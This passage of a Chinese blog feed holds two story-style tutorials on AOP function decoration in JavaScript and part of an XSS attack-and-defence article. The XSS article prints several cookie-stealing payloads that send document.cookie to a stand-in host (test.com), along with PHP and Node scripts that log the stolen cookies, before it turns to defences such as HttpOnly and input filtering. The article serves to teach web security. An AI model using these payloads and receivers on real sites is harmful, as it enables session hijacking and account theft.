class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(username.value == <span class="string">''</span>)&#123;</span><br><span class="line">        retrun alert(<span class="string">'用户名不能为空'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(password.value == <span class="string">''</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">'密码不能为空'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( validata() === <span class="literal">false</span> )&#123; <span class="comment">//校验未通过</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> param = &#123;</span><br><span class="line">        username = username.value,</span><br><span class="line">        password = password.value</span><br><span class="line">    &#125;</span><br><span class="line">   ajax(<span class="string">'http://xxx.com/login'</span>,param); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">submitBtn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    formSubmit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在代码有了一些改进，小T已经把校验的逻辑放到了validata函数中，但是formSubmit函数内部还要计算validata函数的返回值，因为返回值的表明了是否通过校验。接下来小T想通过AOP来优化这段代码，使validata函数和formSubmit函数完全分离开来，这里小T发现些不一样的地方，因为要先校验，如果校验不通过不能执行后面的ajax代码，小T决定对上面学习的AOP进行改写：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="comment">// beforefn返回false，直接return，不在执行后面的原函数</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> validata = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( username.value === <span class="string">''</span> )&#123;</span><br><span class="line">        alert ( <span class="string">'用户名不能为空'</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( password.value === <span class="string">''</span> )&#123;</span><br><span class="line">        alert ( <span class="string">'密码不能为空'</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> param = &#123;</span><br><span class="line">    username: username.value,</span><br><span class="line">    password: password.value</span><br><span class="line">    &#125;</span><br><span class="line">    ajax( <span class="string">'http:// xxx.com/login'</span>, param );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">formSubmit = formSubmit.before( validata );</span><br><span class="line"></span><br><span class="line">submitBtn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    formSubmit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，校验输入和提交表单的代码就完全分离开来，它们不在存在耦合关系，如同把校验规则动态接在formSubmit函数之前，validata成了一个即插即用的函数，它甚至可以写成配置文件的形式，非常有利于分开维护这两个函数。</p><p>但是慢慢的小T也发现了用AOP装饰函数的一些缺点：因为函数通过Function.prototype.before和Function.prototype.after被装饰之后，返回的实际是一个新的函数，如果在原函数上保存了一些属性，那么这些属性会丢失：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func.a = <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line">func = func.after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">alert(func.a); <span class="comment">//输出undefined</span></span><br></pre></td></tr></table></figure><p>除此之外，用AOP装饰方式也叠加了函数的作用域，如果装饰的链条过长，性能上也会受到一定的影响。</p><h1 id="金风玉露一相逢"><a href="#金风玉露一相逢" class="headerlink" title="金风玉露一相逢"></a>金风玉露一相逢</h1><p>小T终于完成了用AOP装饰函数的学习旅程，短短三天，小T与AOP从素未谋面到彼此熟悉，最后相熟相知，小T终于可以用AOP融会贯通的处理日常一些分离代码功能提高代码复用性的任务。渐渐的小T也了解到了用AOP装饰函数方式的缺点，更加游刃有余的结合实际开发进行运用</p><p><strong>人物与故事纯属虚构</strong></p><h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><p>《JavaScript设计模式与开发实践》 -  AlloyTeam曾探</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;后续：纸上得来终觉浅&quot;&gt;&lt;a href=&quot;#后续：纸上得来终觉浅&quot; class=&quot;headerlink&quot; title=&quot;后续：纸上得来终觉浅&quot;&gt;&lt;/a&gt;后续：纸上得来终觉浅&lt;/h1&gt;&lt;p&gt;老大见小T终于摸清了用AOP装饰函数的一些套路，很是欣慰，决定用实际情景让他试一试，老大拿出了一个最常见的AOP的经典应用之一—数据统计上报的情景，分离业务代码和数据统计上报的代码，在实际开发中项目结尾阶段难免要加上很多统计数据的代码，这个过程可能被迫改动早已封装好的函数.&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaScript" scheme="https://www.chenqaq.com/categories/JavaScript/"/>
    
      <category term="设计模式" scheme="https://www.chenqaq.com/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
      <category term="JavaScript" scheme="https://www.chenqaq.com/tags/JavaScript/"/>
    
      <category term="设计模式" scheme="https://www.chenqaq.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="AOP" scheme="https://www.chenqaq.com/tags/AOP/"/>
    
  </entry>
  
  <entry>
    <title>用AOP装饰函数-摸索篇</title>
    <link href="https://www.chenqaq.com/2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1/"/>
    <id>https://www.chenqaq.com/2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1/</id>
    <published>2018-10-18T11:13:20.000Z</published>
    <updated>2020-07-23T04:13:38.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="开始：小荷才露尖尖角"><a href="#开始：小荷才露尖尖角" class="headerlink" title="开始：小荷才露尖尖角"></a>开始：小荷才露尖尖角</h1><p>有一天，老大见程序员小T的核心逻辑代码相当冗杂，核心逻辑模块和一些无关的功能融成一团，就告诉小T，让他尝试把日志统计，异常处理模块从和核心逻辑模块中抽离出来，对于刚入职经验不足的小T来说，犹如晴天霹雳。小T前思后想，还好大学期间读了不少编程相关的书籍有些功底，既然目的是想把一些日志统计、异常处理这些和核心逻辑代码无关的抽离出来，他灵机一闪，心想这不是面向切面编程(AOP)嘛，老大果然是老司机，把和核心逻辑模块无关的功能抽离出来，业务逻辑模块就清晰了很多，还能够复用日志统计、日常处理等这些功能模块，真是两全其美啊！</p><a id="more"></a><h1 id="发展：闲敲棋子落灯花"><a href="#发展：闲敲棋子落灯花" class="headerlink" title="发展：闲敲棋子落灯花"></a>发展：闲敲棋子落灯花</h1><p>于是小T开始了实现AOP之旅，心想核心业务模块和其他模块，那我就抽象成两个函数，既然需要在核心业务模块中使用异常处理这些功能，我应该把异常处理函数动态织入到其中，想到这小T不禁欣喜了一番，但是马上又陷入了思考，我应该怎么把一个函数”动态织入”到另一个函数中呢？小T之前对于原型的掌握相当扎实，于是他想我可不可以扩展Function的原型来把一个函数”动态织入”另一个函数呢.小T决定试一下，于是便敲敲打打：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小T很快有了一个比较清晰的规划，我需要一个原函数（核心逻辑模块）和新函数（日志统计），我可以把”动态织入”的新函数作为参数传递，然后返回原函数和新函数的”代理”函数，然后执行，这样我不就可以在原函数之前执行新函数啦。既然Function.prototype.before里有原函数又有传递的新函数参数，新函数被执行后this的指向可能会被劫持，所以他想到了先保存一下原函数引用</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = fcuntion(beforefn)&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;  <span class="comment">//保存原函数的引用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//返回包含了原函数和新函数的”代理“函数</span></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后小T想，既然是before要让新函数在原函数之前执行，return function(){}我应该怎么处理可以让两个函数执行并且不会导致this被劫持呢，小T说如果我直接执行beforefn()，那么this指向会被劫持，小T想到apply/call可以很自然的控制/重写this值，以便定义调用函数时确定this指向哪个对象，决定用apply试试：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = fcuntion(beforefn)&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>); <span class="comment">// 执行新函数，且保证this不被劫持，新函数接受的参数会被原封不会的传入原函数，新函数在原函数之前执行</span></span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>) <span class="comment">//执行原函数并返回原函数执行结果，并保证this不被劫持</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能在函数之前动态的增加功能了，写到这里，小T有些激动，心血来潮决定用同样的方法在函数后也增加功能，但是小T按照上面的方式导致了一系列问题，小T前思后想有些着急了，既然是在函数后增加新功能，让参数函数afterfn先执行显然是不正确的了，于是小T决定这样做：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.after = <span class="function"><span class="keyword">function</span>(<span class="params">afterfn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> ret = _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        afterfn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="高潮：漫卷诗书喜欲狂"><a href="#高潮：漫卷诗书喜欲狂" class="headerlink" title="高潮：漫卷诗书喜欲狂"></a>高潮：漫卷诗书喜欲狂</h1><p>终于下班啦，晚上回到家小T躺在沙发上敲着mac回想起以前经常需要在不修改源代码的情况下给函数增加新功能，他常规的做法会先预保存原引用，比如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 同事之前代码 --&gt;</span><br><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- 小T需要给a增加新功能 --&gt;</span><br><span class="line"><span class="keyword">let</span> _a = a;</span><br><span class="line">a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    _a();</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br></pre></td></tr></table></figure><p>但是老大之前曾经告诉他，这虽然是一种符合开-闭原则常规的做法，但是因为总是需要维护_a()函数也许你会经常遇到_a()装饰链较长，装饰函数变多，中间变量数量也会越来越多，有时候还会遇到this被劫持。比如</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _getElementById = <span class="built_in">document</span>.getElementById;</span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="function"><span class="keyword">function</span>(<span class="params"> id </span>)</span>&#123;</span><br><span class="line">    alert (<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> _getElementById( id ); <span class="comment">//Uncaught TypeError: Illegal invocation</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById( <span class="string">'button'</span> );</span><br></pre></td></tr></table></figure><blockquote><p>在alert(1)弹出之后，控制台很明显的报了Uncaught TypeError: Illegal invocation的错误，异常就发生在_getElementById(id)这句话上，因为_getElementById是一个全局函数，this是指向window的，而document.getElementById的内部实现需要使用this引用，this在这个方法内的预期是指向document，而不是window，所以就产生了这样的错误。</p></blockquote><p>所以就需要手动把document当作上下文this传入_getElementById，常用的就是使用<code>call/apply</code>来改变this的指向，老大曾还直言不讳的告诉小T，对call/apply的掌握程度是可能间接性决定了你对JavaScript的精通度，于是小T便对call/apply针对性的理解练习和实践:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _getElementById = <span class="built_in">document</span>.getElementById;</span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> _getElementById.apply(<span class="built_in">document</span>,<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById(<span class="string">'button'</span>);</span><br></pre></td></tr></table></figure><p>但是这样的做法有些不方便，用AOP装饰函数可以很方便的解决这个问题，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="built_in">document</span>.getElementById.before(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById(<span class="string">'button'</span>);</span><br></pre></td></tr></table></figure><p>在试一个简单的栗子，利用<code>Function.prototype.after</code>来增加新的window.onload事件：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 同事之前代码 --&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- 需要新增加 --&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = (<span class="built_in">window</span>.onload || <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">3</span>);</span><br><span class="line">&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">4</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>就这样敲着敲着，窗外的夜变得寂静些许，只听到小Tcode code的键盘击打声，他抬头看了看墙上的钟表已经凌晨一点了，望了望窗外，月光洒在窗台，小T终于摸清楚了用AOP装饰函数的意图，但是小T有些不满足，因为在Function.prototype上添加before和after方法，是一种污染原型的方法，小T有些排斥，决定把新函数和原函数都作为参数传入before和after方法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> before = <span class="function"><span class="keyword">function</span>(<span class="params">fn,beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> fn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = before(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">3</span>)&#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">2</span>)&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">a = before(a,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>);&#125;);  <span class="comment">//需要在a()之前增加新方法</span></span><br><span class="line">a();</span><br></pre></td></tr></table></figure><p>窗外的夜更深了，小T按下了关机键，还来不及摸到卧室，就已经慢慢的在沙发上闭上了眼睛，就这样伴随着墙上钟表滴答声，小T进入了梦乡。第二天睡眼惺忪的他揉了揉眼睛，开始了又一天的新生活…</p><p><strong>人物与故事纯属虚构</strong></p><h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><p>《JavaScript设计模式与开发实践》 -  AlloyTeam曾探</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;开始：小荷才露尖尖角&quot;&gt;&lt;a href=&quot;#开始：小荷才露尖尖角&quot; class=&quot;headerlink&quot; title=&quot;开始：小荷才露尖尖角&quot;&gt;&lt;/a&gt;开始：小荷才露尖尖角&lt;/h1&gt;&lt;p&gt;有一天，老大见程序员小T的核心逻辑代码相当冗杂，核心逻辑模块和一些无关的功能融成一团，就告诉小T，让他尝试把日志统计，异常处理模块从和核心逻辑模块中抽离出来，对于刚入职经验不足的小T来说，犹如晴天霹雳。小T前思后想，还好大学期间读了不少编程相关的书籍有些功底，既然目的是想把一些日志统计、异常处理这些和核心逻辑代码无关的抽离出来，他灵机一闪，心想这不是面向切面编程(AOP)嘛，老大果然是老司机，把和核心逻辑模块无关的功能抽离出来，业务逻辑模块就清晰了很多，还能够复用日志统计、日常处理等这些功能模块，真是两全其美啊！&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaScript" scheme="https://www.chenqaq.com/categories/JavaScript/"/>
    
      <category term="设计模式" scheme="https://www.chenqaq.com/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
      <category term="JavaScript" scheme="https://www.chenqaq.com/tags/JavaScript/"/>
    
      <category term="设计模式" scheme="https://www.chenqaq.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="AOP" scheme="https://www.chenqaq.com/tags/AOP/"/>
    
  </entry>
  
  <entry>
    <title>web安全-浅谈xss攻防（二）</title>
    <link href="https://www.chenqaq.com/2018/10/10/xss-attack-defense02-md/"/>
    <id>https://www.chenqaq.com/2018/10/10/xss-attack-defense02-md/</id>
    <published>2018-10-10T08:05:13.000Z</published>
    <updated>2020-07-23T04:13:38.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次介绍了什么是XSS以及XSS的三种类型，作为上次小尾巴的总结来说：XSS跨站脚本是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对于用户的输入过滤不足引起的。攻击者利用网站漏洞把恶意脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，轻者能达到恶作剧的目的，重者可以对受害者采取cookie资料窃取，会话劫持，钓鱼欺骗等各种攻击；分为三种类型，服务端的存储型和反射性，客户端自身漏洞引起的DOM型。这次我简单总结一些常见的攻击对应的防御措施，方便以后学习回顾;</p><a id="more"></a><h1 id="1-Cookie劫持"><a href="#1-Cookie劫持" class="headerlink" title="1.Cookie劫持"></a>1.Cookie劫持</h1><p>下面是几种是窃取用户Cookie信息的恶意代码，攻击者向漏洞页面写入类似的恶意代码从而达到获取客户端cookie信息的目的:</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">new</span> Image().src=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">img=<span class="keyword">new</span> Image();img.src=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span>;img.wdith=<span class="number">0</span>;img.height=<span class="number">0</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">document.write('<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span>')</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诸如此类，一旦注入成功，这些恶意代码都会向某个特定的远程服务器提交cookie，攻击者会在远程服务器上写一个接收和记录cookie信息的文件<br>例如php版本：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">    $log= fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">    fwrite($log,$cookie .<span class="string">"\n"</span>);</span><br><span class="line">    fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者node来处理:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Cookies = &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    req.headers.cookie &amp;&amp; req.headers.cookie.split(<span class="string">';'</span>).foEach(<span class="function"><span class="keyword">function</span>(<span class="params">Cookies</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> parts = Cookie.split(<span class="string">'='</span>);</span><br><span class="line">        Cookies[ parts[ <span class="number">0</span> ].trim() ] = ( parts[ <span class="number">1</span> ] || <span class="string">''</span> ).trim();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(Cookies)</span><br><span class="line"></span><br><span class="line">    res.writeHeader(<span class="number">200</span>,&#123;</span><br><span class="line">        <span class="string">'Set-Cookie'</span> : <span class="string">'SSID=EqAc1D; Expires=Wed'</span>, </span><br><span class="line">        <span class="comment">// 注意上面我们不设置HttpOnly;Fix:&gt;&gt;&gt;'SSID=EqAc1D; Expires=Wed;HttpOnly'&lt;&lt;&lt;</span></span><br><span class="line"><span class="string">'Content-Type'</span> : <span class="string">'text/plain'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    fs.open(<span class="string">'cookie.txt'</span>,<span class="string">'r+'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,fd</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">        &#125;</span><br><span class="line">        fs.writeFile(fd,Cookies,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).listen(<span class="number">8000</span>);</span><br></pre></td></tr></table></figure><p>亦或是jsp版本、python flask等等诸如此类可以获取到从客户端发来的cookie做接收和记录操作的。</p><p>获取到存储信息的cookie.txt后，攻击者就可以通过修改网站的cookie信息（f12打开开发者控制工具，application/Cookies）来登入网站，从而来进行进一步的攻击操作。</p><h2 id="防止cookie会话劫持"><a href="#防止cookie会话劫持" class="headerlink" title="防止cookie会话劫持"></a>防止cookie会话劫持</h2><p>根本原因是攻击者获取cookie的恶意js代码注入到站点，进一步传到攻击者的远程服务器，从而进行攻击操作；<br>对于可能的意外注入站点的获取cookie的恶意js代码，我们一般要在设置cookie时加HttpOnly，来禁止意外注入站点的恶意js代码操作Cookie造成xss攻击<br>比如node设置HttpOnly：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'Set-Cookie'</span> : <span class="string">'SSID=EqAc1D; Expires=Wed ;HttpOnly'</span></span><br></pre></td></tr></table></figure><p>或者php设置HttpOnly：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ini_set(<span class="string">"session.cookie_httponly"</span>, <span class="number">1</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="2-提高攻击门槛"><a href="#2-提高攻击门槛" class="headerlink" title="2.提高攻击门槛"></a>2.提高攻击门槛</h1><h2 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h2><p>针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容，例如：<br>1.表单数据指定值的类型：年龄只能是 int 、name 只能是字母数字等<br>2.过滤或移除特殊的 html 标签：<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>等<br>3.过滤 js 事件的标签：onclick、onerror、onfocus等<br>4.对于要求用户输入的一些特殊格式的字段，用正则和字段长度进行严格限制，比如手机号，邮箱等<br>如在客户端进行验证手机号的JavaScript代码:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> id=<span class="string">"tel"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"button"</span> onclick=<span class="string">"checkTel()"</span>&gt; </span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    function()&#123;</span></span><br><span class="line"><span class="regexp">        let re = /</span>^<span class="number">020</span>-\d&#123;<span class="number">8</span>&#125;$/;</span><br><span class="line">        <span class="keyword">if</span>(re.test(<span class="built_in">document</span>.getElementById(<span class="string">"Tel"</span>).value))&#123;</span><br><span class="line">            alert(<span class="string">'电话号码格式正确'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">'错误的电话号码'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span 